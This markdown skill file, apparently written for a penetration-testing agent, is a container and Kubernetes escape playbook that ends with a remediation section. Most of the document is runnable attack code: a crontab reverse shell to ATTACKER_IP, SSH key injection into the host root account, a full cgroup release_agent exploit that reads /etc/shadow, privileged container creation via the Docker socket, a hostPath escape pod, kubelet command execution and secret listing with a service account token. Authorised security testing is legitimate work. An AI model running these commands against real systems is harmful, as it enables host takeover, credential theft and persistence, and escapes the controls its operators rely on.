---
name: container_escape
description: Container and sandbox escape testing covering Docker breakout, shared kernel exploits, misconfigurations, and privilege escalation
---

# Container Escape & Breakout Vulnerabilities

## 1. Docker Container Escape

### Privileged Container Detection

Check if running inside a privileged container:

```bash
# Check effective capabilities — full set (ffffffffffffffff) = privileged
cat /proc/1/status | grep -i cap

# Human-readable capabilities
capsh --print 2>/dev/null || cat /proc/1/status | grep Cap

# Check if we have CAP_SYS_ADMIN (the "god" capability)
grep -i "CapEff" /proc/1/status
# ffffffffffffffff = privileged container

# Quick check for common escape indicators
echo "--- Security Context ---"
cat /proc/1/status | grep -E "Cap|Seccomp|NoNewPrivs"
echo "--- AppArmor Profile ---"
cat /proc/1/attr/current 2>/dev/null
echo "--- Seccomp Mode ---"
cat /proc/1/status | grep Seccomp
```

### Host Filesystem Mount Escape

If the host filesystem is mounted inside the container, you can read/write host files:

```bash
# Check for host mounts
mount | grep -E "/host|/rootfs|/mnt"
df -h 2>/dev/null

# Look for common host mount points
ls -la /host 2>/dev/null
ls -la /rootfs 2>/dev/null
ls -la /mnt/host 2>/dev/null

# Check all mounts for host filesystem indicators
cat /proc/mounts | grep -v -E "^(proc|sys|tmpfs|overlay|devpts|shm)"

# If host root is mounted at /host:
# Write SSH key to host
mkdir -p /host/root/.ssh
echo "YOUR_PUBKEY" >> /host/root/.ssh/authorized_keys

# Or add a crontab reverse shell
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /host/etc/crontab
```

### Cgroup Escape (release_agent exploit)

Works in privileged containers with write access to cgroup:

```bash
# Step 1: Check if cgroup escape is possible
mkdir /tmp/cgrp 2>/dev/null
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
if [ $? -eq 0 ]; then
    echo "Cgroup mount possible — escape candidate"
fi

# Step 2: Full cgroup release_agent exploit
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"

# Enable notify_on_release
echo 1 > "$d/w/notify_on_release"
# Set release_agent to a script on the host
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > "$d/release_agent"

# Write the command to execute on host
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd

# Trigger release_agent by creating and killing a process in the cgroup
sh -c "echo \$\$ > $d/w/cgroup.procs"

# Read host output
cat /output 2>/dev/null
```

### Docker Socket Exposure

```bash
# Check for exposed Docker socket
ls -la /var/run/docker.sock 2>/dev/null
ls -la /run/docker.sock 2>/dev/null

# If docker.sock exists, full host takeover:
# Install docker CLI or use curl
# List containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool 2>/dev/null

# Spawn a new privileged container with host root mounted
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Privileged":true,"Binds":["/:/mnt/host"]}' | python3 -m json.tool

# Or with docker CLI if available
docker run --rm -it --privileged -v /:/mnt/host alpine chroot /mnt/host
```

### AppArmor / SELinux Profile Weaknesses

```bash
# Check current AppArmor profile
cat /proc/1/attr/current 2>/dev/null
# "unconfined" = no AppArmor restrictions

# Check if AppArmor is loaded
cat /sys/module/apparmor/parameters/enabled 2>/dev/null

# Check SELinux status
getenforce 2>/dev/null || cat /sys/fs/selinux/enforce 2>/dev/null
# 0 = Permissive, 1 = Enforcing

# Check for unconfined profiles
cat /proc/self/attr/current 2>/dev/null
```

## 2. Shared Kernel Exploits

### Kernel Version Fingerprinting

```bash
uname -a
cat /proc/version

# Check for known vulnerable kernel versions
# Dirty Pipe (CVE-2022-0847): Linux 5.8 - 5.16.11, 5.15.25, 5.10.102
# Dirty COW (CVE-2016-5195): Linux 2.6.22 - 4.8.3
# Looney Tunables (CVE-2023-4911): glibc with ld.so SUID

uname -r | awk -F. '{
    major=$1; minor=$2; patch=$3
    if (major == 5 && minor >= 8 && minor <= 16) print "Potentially vulnerable to Dirty Pipe (CVE-2022-0847)"
    if (major == 4 && minor <= 8) print "Potentially vulnerable to Dirty COW (CVE-2016-5195)"
}'
```

### eBPF-Based Escapes

```bash
# Check if unprivileged eBPF is allowed (enables various escapes)
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = unprivileged eBPF allowed (dangerous)

# Check kernel lockdown mode
cat /sys/kernel/security/lockdown 2>/dev/null
# [none] = no lockdown (most permissive)

# Check if BPF helpers are available
ls /sys/fs/bpf 2>/dev/null
```

## 3. Container Misconfigurations

### Capabilities Check

```bash
# Full capabilities dump
capsh --print 2>/dev/null || {
    echo "=== Effective Capabilities ==="
    python3 -c "
import os
caps = int(open('/proc/1/status').read().split('CapEff:')[1].split()[0], 16)
cap_names = {0:'CHOWN',1:'DAC_OVERRIDE',2:'DAC_READ_SEARCH',3:'FOWNER',4:'FSETID',
5:'KILL',6:'SETGID',7:'SETUID',8:'SETPCAP',9:'LINUX_IMMUTABLE',10:'NET_BIND_SERVICE',
11:'NET_BROADCAST',12:'NET_ADMIN',13:'NET_RAW',14:'IPC_LOCK',15:'IPC_OWNER',
16:'SYS_MODULE',17:'SYS_RAWIO',18:'SYS_CHROOT',19:'SYS_PTRACE',20:'SYS_PACCT',
21:'SYS_ADMIN',22:'SYS_BOOT',23:'SYS_NICE',24:'SYS_RESOURCE',25:'SYS_TIME',
26:'SYS_TTY_CONFIG',27:'MKNOD',28:'LEASE',29:'AUDIT_WRITE',30:'AUDIT_CONTROL',
31:'SETFCAP',32:'MAC_OVERRIDE',33:'MAC_ADMIN',34:'SYSLOG',35:'WAKE_ALARM',
36:'BLOCK_SUSPEND',37:'AUDIT_READ',38:'PERFMON',39:'BPF',40:'CHECKPOINT_RESTORE'}
for bit, name in cap_names.items():
    if caps & (1 << bit):
        print(f'  CAP_{name}')
" 2>/dev/null
}

# Dangerous capabilities that enable escape:
# CAP_SYS_ADMIN — mount, cgroup, namespace manipulation
# CAP_SYS_PTRACE — inspect other processes (host processes if PID namespace shared)
# CAP_DAC_READ_SEARCH — bypass file read permissions
# CAP_NET_ADMIN + CAP_NET_RAW — network namespace escape
```

### Seccomp Profile Analysis

```bash
# Check seccomp mode
cat /proc/1/status | grep Seccomp
# Seccomp: 2 = filter mode (good), 0 = disabled (bad)

# Check if we can load new seccomp filters
grep Seccomp_filters /proc/1/status 2>/dev/null
```

### Writable Sensitive Paths

```bash
# Test write access to sensitive paths
for path in /proc/sys /sys /proc/sysrq-trigger /sys/kernel/uevent_helper; do
    touch "$path/.prometheus_test" 2>/dev/null && echo "WRITABLE: $path" && rm "$path/.prometheus_test"
done

# Check for writable /proc/sys (can modify kernel parameters)
echo 1 > /proc/sys/kernel/core_pattern 2>/dev/null && echo "DANGEROUS: /proc/sys writable"

# Check core_pattern for escape vector
cat /proc/sys/kernel/core_pattern
# If it points to a writable path, use core dump escape:
# echo "|/tmp/evil" > /proc/sys/kernel/core_pattern
# sleep 1 & kill -SIGSEGV $!
```

### Environment Variable Secrets

```bash
# Container env vars often contain secrets
env | grep -iE "pass|secret|key|token|api|auth|cred|aws|azure|gcp|database|mysql|postgres|redis|mongo"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|secret|key|token"
```

### Network Namespace Sharing

```bash
# Check if container shares host network namespace
if [ -f /proc/1/net/tcp ]; then
    # If we can see host services in the port range, we share the host network
    ss -tlnp 2>/dev/null || cat /proc/net/tcp
fi

# Check if host PID namespace is shared (PID 1 = init/systemd)
cat /proc/1/cmdline | tr '\0' ' '
# If PID 1 is systemd/init (not a container entrypoint), PID namespace is shared
```

## 4. Kubernetes-Specific Exploits

### RBAC Misconfiguration

```bash
# Check service account permissions
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
APISERVER=https://kubernetes.default.svc

# List all permissions for current SA
curl -s -k -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReviews"}' 2>/dev/null

# Try to create privileged pods (cluster-admin level)
curl -s -k -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion":"v1","kind":"Pod",
    "metadata":{"name":"escape-pod"},
    "spec":{
      "containers":[{
        "name":"escape","image":"alpine",
        "command":["/bin/sh","-c","cat /host/etc/shadow"],
        "volumeMounts":[{"name":"host","mountPath":"/host"}]
      }],
      "volumes":[{"name":"host","hostPath":{"path":"/"}}]
    }
  }'
```

### Service Account Token Abuse

```bash
# Token is auto-mounted unless disabled
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Test API access
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# List secrets in namespace
curl -s -k -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/namespaces/default/secrets" 2>/dev/null

# List all namespaces (tests cluster-level access)
curl -s -k -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/namespaces" 2>/dev/null

# Read configmaps for configuration secrets
curl -s -k -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/namespaces/default/configmaps" 2>/dev/null
```

### etcd Access

```bash
# Check for etcd access (typically port 2379)
# From inside a pod sharing host network:
curl -s https://127.0.0.1:2379/v2/keys/ --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key 2>/dev/null

# Check if etcd port is reachable
timeout 2 bash -c "echo > /dev/tcp/10.96.0.1/2379" 2>/dev/null && echo "etcd reachable"
```

### kubelet API Access

```bash
# kubelet typically runs on port 10250
KUBELET_HOSTS="10.0.0.1 127.0.0.1 $(hostname -i 2>/dev/null)"

for host in $KUBELET_HOSTS; do
    # Check anonymous access to kubelet
    curl -sk "https://$host:10250/pods" 2>/dev/null | head -c 200
    # Run command in a pod
    curl -sk "https://$host:10250/run/$NAMESPACE/$PODNAME/escape-container" \
      -X POST -d "cmd=cat /etc/shadow" 2>/dev/null
done
```

## 5. OCI/Runtime Specific

### runc CVEs

```bash
# Check runc version
runc --version 2>/dev/null || cat /proc/1/cmdline | tr '\0' ' '
# CVE-2024-21626 (runc < 1.1.12): fd leak escape via WORKDIR
# CVE-2019-5736 (runc < 1.0-rc6): overwrite host runc binary

# Check if runc binary is accessible from container
ls -la /usr/bin/runc /usr/sbin/runc /usr/local/bin/runc 2>/dev/null
```

### containerd CVEs

```bash
# Check containerd version
containerd --version 2>/dev/null
# CVE-2022-23648: arbitrary file read via containerd
# CVE-2022-24769: inheritable capabilities not dropped

# Check for containerd socket
ls -la /run/containerd/containerd.sock 2>/dev/null
```

### BuildKit Vulnerabilities

```bash
# CVE-2024-23651: race condition in BuildKit allows host filesystem access
# CVE-2024-23652: arbitrary file deletion via BuildKit
# Check if BuildKit is running
ps aux 2>/dev/null | grep -i buildkit
ls -la /run/buildkit/ 2>/dev/null
```

## 6. Testing Methodology

### Step-by-Step Container Escape Assessment

```
PHASE 1: Reconnaissance
├── Identify container runtime (Docker, containerd, CRI-O)
├── Check /proc/1/cgroup and /proc/1/mountinfo
├── Enumerate kernel version
└── Map network connectivity

PHASE 2: Capability & Permission Assessment
├── Dump all capabilities (capsh --print)
├── Check seccomp and AppArmor profiles
├── Test writable paths (/proc/sys, /sys)
└── Check for mounted host filesystems

PHASE 3: Exploit Identification
├── Match capabilities to known escape vectors
├── Check kernel version against CVE database
├── Test Docker socket access
└── Test Kubernetes API access

PHASE 4: Exploitation
├── Attempt most reliable escape first (Docker socket)
├── Proceed to capability-based escapes
├── Try kernel exploits if versions match
└── Document each attempt

PHASE 5: Validation
├── Confirm host access (read /etc/shadow or /proc/1/root)
├── Verify persistence options
└── Clean up artifacts
```

## 7. Key Vulnerabilities Reference

| CVE / Technique | Requirements | Severity |
|---|---|---|
| Docker socket exposed | Socket mounted in container | Critical |
| Privileged container | --privileged flag | Critical |
| Host mount escape | Host FS mounted writable | Critical |
| Cgroup release_agent | CAP_SYS_ADMIN + cgroup write | High |
| Dirty Pipe (CVE-2022-0847) | Kernel 5.8-5.16 | High |
| Dirty COW (CVE-2016-5195) | Kernel 2.6.22-4.8 | High |
| CVE-2024-21626 (runc) | runc < 1.1.12 | High |
| kubelet anonymous auth | Network access to kubelet | High |
| K8s SA token abuse | SA with excessive RBAC | High |
| SYS_PTRACE escape | CAP_SYS_PTRACE | Medium |
| Network namespace shared | --net=host | Medium |
| Core pattern escape | Writable /proc/sys | Medium |

## 8. Validation

Confirm successful escape:

```bash
# Verify host filesystem access
cat /proc/1/root/etc/shadow 2>/dev/null | head -1

# Verify host command execution (cgroup escape)
# Should see output from host filesystem
cat /output 2>/dev/null

# Verify Kubernetes cluster-admin
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/secrets" | python3 -m json.tool 2>/dev/null
```

## 9. Remediation

### Docker / Container Runtime

- Never run containers with `--privileged` unless absolutely necessary
- Drop all capabilities, add only required ones: `--cap-drop=ALL --cap-add=<specific>`
- Use read-only filesystem: `--read-only`
- Mount tmpfs for writable paths: `--tmpfs /tmp:rw,noexec,nosuid`
- Never mount Docker socket into containers
- Use rootless containers (user namespace remapping)
- Enable user namespace isolation: `--userns-remap`

### Seccomp & AppArmor

- Always use a restrictive seccomp profile (not `unconfined`)
- Apply AppArmor profiles with least privilege
- Set `no-new-privileges: true` in security context

### Kubernetes

- Use Pod Security Standards (Restricted profile)
- Disable automounting of SA tokens: `automountServiceAccountToken: false`
- Enforce RBAC least privilege (no wildcard verbs/resources)
- Enable admission controllers: PodSecurity, NodeRestriction
- Use Network Policies to restrict pod-to-API-server access
- Rotate and expire service account tokens

### Kernel Hardening

- Keep kernel updated (patch Dirty Pipe, Dirty COW, etc.)
- Set `kernel.unprivileged_bpf_disabled=1`
- Enable kernel lockdown mode: `lockdown=confidentiality`
- Restrict `kernel.unprivileged_userns_clone=0`

### Monitoring

- Audit container escape attempts via Falco rules
- Monitor for `nsenter`, `chroot`, and `mount` syscalls from containers
- Alert on containers with unexpected capability sets
- Log and alert on kubelet/exec API calls
